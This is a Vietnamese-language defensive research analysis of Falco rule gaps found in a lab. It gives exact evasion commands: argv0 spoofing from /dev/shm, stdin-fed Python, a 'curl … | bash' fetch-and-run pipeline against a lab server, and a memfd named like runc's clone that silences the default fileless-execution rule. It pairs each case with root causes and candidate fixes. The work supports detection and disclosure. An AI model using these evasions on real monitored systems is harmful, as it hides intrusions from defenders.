# Evasion Layers and Root Causes in Falco's Event Model

Phân tích các trường hợp Falco 0.45.0 (ruleset `falco-rules-5.2.0` + 6 custom rule v1) bỏ lọt hoặc gán nhầm trong lab. Mỗi mục tách **quan sát** (có evidence) khỏi **diễn giải** (nguyên nhân) và **giảm thiểu** (đề xuất). Nhãn: VERIFIED, PARTIALLY VERIFIED, INFERRED (suy từ code/điều kiện rule, chưa chạy), NOT TESTED.

Số liệu đến từ `report/tables/*.csv`; rule ứng viên ở `rules/candidate_rules_v2.yaml` (chỉ validate cú pháp, **NOT TESTED**).

## Bảng tổng hợp

| Evasion behavior | Rule assumption | Observable field (Falco 0.45 có) | Root cause | Security implication | Mitigation |
|---|---|---|---|---|---|
| `exec -a kworker /dev/shm/x` (E4-T2b; miss 5/5 cả default và custom) | `proc.exe` (= argv[0]) phản ánh đường dẫn binary | `proc.exepath` (kernel), `evt.arg.filename`; Auditd `exe=`/`PATH` | Rule khoá vào giá trị do tiến trình tự đặt | Đổi argv0 là đủ né rule stable `Execution from /dev/shm` | Dùng `proc.exepath`/`evt.arg.filename` (R1, NOT TESTED). Docker mặc định mount `/dev/shm` noexec (T2-ctr blocked 5/5). |
| `python3 -` đọc code từ stdin (E4-T4b; miss 5/5) | Code inline nằm trong argv (`-c`/`-e`) | `proc.args`, `proc.stdin.type`, `proc.stdin.name` | Nội dung chương trình không đi qua execve; rule chỉ nhìn argv | Mọi kênh đưa code ngoài argv (stdin, here-doc, file tạm) đều vô hình với rule dựa cmdline | Interpreter không có file script + stdin là pipe (R2, NOT TESTED; FP với `docker exec -i`) |
| Pipeline `curl … \| bash` nằm trong file script (E4-T5b; miss 5/5) | Pipeline xuất hiện trong `proc.pcmdline` | `proc.pcmdline`, `proc.aname[n]`, `proc.stdin.type` (shell), `proc.stdout.type` (curl) | Lineage là cây cha–ông; không có cạnh anh em/pipe giữa `curl` và `bash` | Một lớp gián tiếp (script, shell tương tác) làm mất tín hiệu | Shell không tham số + stdin pipe (R3) và downloader + stdout pipe (R3b), tương quan theo container/thời gian (NOT TESTED) |
| memfd đặt tên `runc_cloned:/proc/self/exe` (DEV-T1r; default miss 5/5, **0 alert** cả run) | Chuỗi tên memfd / argv0 / tên tiến trình xác định bản clone của runc | `proc.exepath`, `proc.exe`, `proc.pname`, `proc.pexepath`; Auditd `memfd_create` `a1` (cờ) | Ngoại lệ (allowlist) dựa trên nhãn do tiến trình tự đặt | Rule Critical `Fileless execution via memfd_create` bị tắt tiếng hoàn toàn với payload đặt tên đúng | Kiểm cha là binary runc thật: custom v1 bắt 5/5 (VERIFIED); R4 mở rộng cho nhánh `proc.pname`/argv0 (NOT TESTED); bỏ ngoại lệ nếu runc của hệ thống không clone qua memfd |
| `link()` binary hệ thống rồi exec qua fd (T3a; misattrib 5/5) | Exe ở upper layer = binary mới được thả | `proc.is_exe_upper_layer`, `proc.exe_ino.ctime/mtime`, `evt.arg.filename` | Copy-up overlayfs do `link()` bật cờ upper-layer | Alert bắn vì lý do khác → phân tích viên bị dẫn sai; độ phủ là trùng hợp | Rule theo `evt.arg.filename` `/proc/*/fd/*` (custom v1); chỉ thành direct với `rule_matching=all` |
| Rule custom bị rule default che (T3a/T3c) | Mỗi rule bổ sung được đánh giá độc lập | — | `rule_matching: first`: chỉ rule khớp đầu tiên sinh alert | Custom detection bị tắt tiếng mà không báo | `rule_matching: all` (run bổ trợ: T3a/T3c direct 5/5, VERIFIED) hoặc tổ chức lại thứ tự/điều kiện |

## A. /dev/shm và argv0 (E4-T2b)

**Quan sát (VERIFIED).** `e4_shm_argv0`: `docker run --tmpfs /dev/shm:rw,exec,… bash -c 'cp /bin/echo /dev/shm/falco_shm_test && (exec -a kworker /dev/shm/falco_shm_test "$1")'`. Payload exit 0 + token 5/5; Auditd specific 5/5 với `exe`/`PATH` thật là `/dev/shm/falco_shm_test`; Falco: miss 5/5 ở cả default và custom (`e4_unseen_summary.csv`).

**Nguyên nhân (VERIFIED từ điều kiện rule).** `Execution from /dev/shm` dùng `proc.exe startswith "/dev/shm/"` (và các nhánh `proc.cwd`/`proc.args`). Theo `falco --list`, `proc.exe` là *"the first command-line argument (i.e., argv[0)… or a custom string as specified by the user"*. `exec -a` đặt argv0 = `kworker`. Rule `Drop and execute new binary in container` cũng không bắn vì tmpfs không phải upper layer của overlayfs.

**Giảm thiểu.** `proc.exepath` lấy từ kernel. Trong E1, alert T2 có `proc.exepath=/dev/shm/falco_shm_test_29651` (`results/e1_default_20261021_001604/falco_events.json`) → trường này được điền đúng cho exec từ /dev/shm trên driver này (PARTIALLY VERIFIED: chưa chạy với argv0 giả). Rule R1 dùng `proc.exepath`/`evt.arg.filename`.

**Giới hạn của chính giảm thiểu.** `proc.exepath` có thể bị cắt cụt (modern eBPF giới hạn 96 ký tự mỗi thành phần đường dẫn theo mô tả trường); bind mount /dev/shm sang đường dẫn khác sẽ đổi tiền tố.

## B. Interpreter và stdin (E4-T4b)

**Quan sát (VERIFIED).** `printf "print('…')" | docker exec -i falco-lab-target python3 -` → payload ok 5/5, Auditd 5/5, Falco miss 5/5 (default và custom).

**Nguyên nhân.** Rule custom `LAB Interpreter inline code in container` khớp `proc.args` bắt đầu/chứa `-c`/`-e`. `python3 -` có `proc.args = "-"`. Falco (cũng như execve) không nhìn thấy nội dung chương trình; sự khác biệt giữa *executable* (`/usr/local/bin/python3`), *command line* (`python3 -`), *interpreter* và *dữ liệu script* (đến qua fd 0) là gốc rễ.

**Đính chính báo cáo gốc.** Báo cáo 2026-10-22, `references.md` #5 và chú thích trong `rules/custom_rules.yaml` ghi "Falco 0.45 không có `proc.stdin_type`". Đúng với tên có gạch dưới, nhưng `falco --list=syscall` (2026-11-02, cùng binary 0.45.0) liệt kê **`proc.stdin.type`**, **`proc.stdin.name`**, `proc.stdout.type`, `proc.stderr.type`. Kết luận "không thể dùng stdin=pipe" vì vậy không đúng; đó là lỗi tra cứu tên trường. Giá trị cụ thể (`pipe`) chưa được kiểm bằng probe.

**Giảm thiểu.** R2: interpreter + `proc.args` rỗng hoặc `-` + `proc.stdin.type = pipe`. Rủi ro FP: `docker exec -i … python3 -` hợp lệ, CI.

## C. Download-pipe và process lineage (T5, E4-T5b, E4-T5c)

**Quan sát (VERIFIED).** T5 (`bash -c 'curl … | bash'`): default miss 5/5, custom direct 5/5. E4-T5c (`| sh`): custom direct 5/5. E4-T5b (pipeline trong `/tmp/dl.sh`): miss 5/5 cả hai. Cây tiến trình quan sát được (alert custom T5):

```
containerd-shim                                (proc.aname[2])
└─ bash -c 'set -o pipefail; curl … | bash'    (cha chung; pcmdline của cả hai con)
   ├─ curl -fsS http://falco-lab-server:8000/test.sh#<token>   stdout → pipe
   └─ bash                                      args rỗng, stdin ← pipe
```

**Nguyên nhân.** Falco biểu diễn lineage theo chuỗi cha–ông (`proc.pname`, `proc.aname[n]`, `proc.pcmdline`). `curl` và `bash` là **anh em**; không có trường nào nối hai đầu pipe. Rule custom suy ra quan hệ bằng cmdline của cha chung, nên chỉ hoạt động khi pipeline nằm trong argv của shell cha. Với E4-T5b, cha của `curl` là `bash /tmp/dl.sh` → `pcmdline` không chứa `|`.

**Đánh giá E4-T5c.** Mẫu `"| sh"` đã có trong `rules/custom_rules.draft0.yaml` từ 2026-10-19, trước khi E4 được viết → E4-T5c được *dự liệu*, không thật sự unseen (phân tích độ nhạy: strict custom 2/5 → 1/4 nếu loại).

**Giảm thiểu.** (i) R3: shell không tham số + `proc.stdin.type = pipe` — không cần pipeline trong cmdline; (ii) R3b: downloader + `proc.stdout.type = pipe`; tương quan R3+R3b theo container và cửa sổ thời gian ở SIEM. Nếu cần quan hệ pipe chính xác: so sánh inode pipe (`proc.stdin.name`/`proc.stdout.name` nếu Falco điền `pipe:[ino]` — chưa kiểm) hoặc telemetry khác (Auditd không ghi `pipe()` trong rule hiện tại; Tetragon/Tracee — E7).

## D. memfd và ngoại lệ #3444 (DEV-T1r)

### D1. Rule và nguồn gốc ngoại lệ (VERIFIED)
- `/etc/falco/falco_rules.yaml` sha256 `30a1a602…b865b` = tag `falco-rules-5.2.0` (commit `80880bd5`) = nhánh `main` @ `e7b066bf` (2026-10-22): nội dung giống từng byte.
- Ngoại lệ (dòng 1255–1263):
  ```yaml
  - list: known_memfd_execution_binaries
    items: [runc]
  - macro: known_memfd_execution_processes
    condition: >
      (proc.name in (known_memfd_execution_binaries))
      or (proc.pname in (known_memfd_execution_binaries))
      or (proc.exepath = "memfd:runc_cloned:/proc/self/exe")
      or (proc.exe = "memfd:runc_cloned:/proc/self/exe")
  ```
- Được thêm bởi falcosecurity/rules PR #268 (commit `4633f29`, merge 2025-02-17) để xử lý FP trong falcosecurity/falco issue #3444 (runc ≥ 1.1.15 clone binary qua memfd).
- runc v1.3.3 tạo memfd bằng `system.ExecutableMemfd("runc_cloned:"+comment, unix.MFD_ALLOW_SEALING|unix.MFD_CLOEXEC)` (`libcontainer/exeseal/cloned_binary_linux.go`, dòng 67) và seal file.

### D2. Sự kiện quan sát (VERIFIED)
- Payload `dev_memfd_runcname`: `os.memfd_create('runc_cloned:/proc/self/exe')`, ghi `/bin/echo`, `os.execve(fd, …)` trong `falco-lab-target`.
- Run default `e1_default_20261021_005859_dev`: payload ok 5/5, Auditd specific 5/5, `falco_events.json` có **0 dòng** (không alert nào từ bất kỳ rule nào trong cả run; manifest ghi Falco 0.45.0, ruleset default).
- Auditd: `syscall=319 (memfd_create) a1=1` (chỉ `MFD_CLOEXEC`), `exe=/usr/local/bin/python3`, `subj=docker-default`.
- Run custom `e1_custom_20261021_012554_dev`: `LAB memfd exec masquerading as runc clone` bắn 5/5 với `proc.exepath=memfd:runc_cloned:/proc/self/exe`, `proc.pexepath=/usr/bin/containerd-shim-runc-v2`.
- Đối chứng: T1 (memfd tên `falco_benign_memfd`) bị rule default bắt 5/5.

### D3. Diễn giải nguyên nhân
Tên memfd do tiến trình gọi `memfd_create` tự chọn; kernel hiển thị nó với tiền tố `memfd:` (memfd_create(2): tên "chỉ dùng để debug"). Vì vậy `proc.exepath = "memfd:runc_cloned:/proc/self/exe"` là nhãn **do kẻ tấn công kiểm soát**, không phải bằng chứng tiến trình là runc. Đây là một allowlist dựa trên thuộc tính giả mạo được.

### D4. Phạm vi ảnh hưởng
| Nhánh ngoại lệ | Trạng thái |
|---|---|
| `proc.exepath` (tên memfd) | **VERIFIED** — DEV-T1r lọt 5/5 |
| `proc.exe` (argv0 = `memfd:runc_cloned:/proc/self/exe`, tên memfd tùy ý) | INFERRED từ điều kiện, NOT TESTED |
| `proc.pname in (runc)` | **Một cách đã thử, không vượt qua** (2026-10-20, chỉ có trong transcript phiên Claude Code `d5799203`, không lưu trong `results/`): đổi tên tiến trình cha bằng `prctl(PR_SET_NAME, "runc")` → Falco vẫn ghi `pname=python3` và rule bắn. Cách khởi chạy tiến trình cha từ file thực thi tên `runc` (tên đặt lúc exec): NOT TESTED (NT-02). *Đính chính 2026-11-02: bản trước ghi cả nhánh này là chưa kiểm.* |
| `proc.name in (runc)` | INFERRED khó khai thác: với exec qua fd, `comm` lấy từ tên file (alert custom cho thấy `proc.name=memfd:runc_clon`, cắt 15 ký tự) |
| Phiên bản ảnh hưởng | Mọi bản `falco_rules.yaml` chứa macro này: từ PR #268 (2025-02) đến `main` 2026-10-22, gồm `falco-rules-5.2.0` mà Falco 0.45.0 ghim |
| Điều kiện | Kẻ tấn công đã có khả năng chạy mã trong container/host (đó là tiền đề của rule fileless) |

Kết luận cẩn trọng: đây là **điểm yếu logic trong nội dung rule** (detection-content weakness), quan sát được trong lab. **Không** phải lỗ hổng/CVE đã được xác nhận. Theo SECURITY.md của Falco, "gaps in rule coverage" thường được xử lý như bug thường; phân loại cuối cùng thuộc về maintainer. Bản nháp báo cáo: `docs/responsible_disclosure_draft.md`.

### D5. Giảm thiểu
1. Phân biệt bằng thuộc tính kernel/hệ thống thay vì tên: tiến trình cha chạy từ binary runc thật (`proc.pexepath`) — custom v1 bắt 5/5 (VERIFIED); R4 phủ thêm nhánh `pname`/argv0 (NOT TESTED).
2. Seal của memfd (runc dùng `MFD_ALLOW_SEALING` + seal; payload `a1=1`) là đặc điểm phân biệt có trong Auditd; Falco 0.45 không có trường seal ở thời điểm exec (theo `falco --list`), nên chỉ dùng được ở tầng tương quan.
3. Trên hệ thống mà runc không clone qua memfd (runc 1.3.3 trên VM này: 0 `memfd_create` từ container trong 500 lần churn E2) có thể override macro để bỏ nhánh tên; cần kiểm runc của từng môi trường.

## E. Copy-up overlayfs (T3a) và che rule (T3a/T3c)

**Quan sát (VERIFIED).** T3a: alert `Drop and execute new binary in container` với `proc.exepath=/usr/bin/echo`, mtime của image và ctime mới. T3c: rule đó bắn vì file thả trong `/tmp`. Với `rule_matching=all` (run `e1_custom_20261021_013127_all_t3`) `LAB Exec via proc fd` cũng bắn → direct 5/5.

**Nguyên nhân.** `link("/bin/echo", …)` trên overlayfs làm file bị copy-up lên upper layer → `proc.is_exe_upper_layer` đúng dù không có binary mới. `rule_matching: first` khiến rule custom (nạp sau trong `rules.d/`) không được đánh giá cho event đã khớp rule default.

**Hệ quả.** Độ phủ "có alert" của T3a là trùng hợp và mang sai giải thích; chỉ đếm *direct* mới phản ánh đúng khả năng phát hiện.
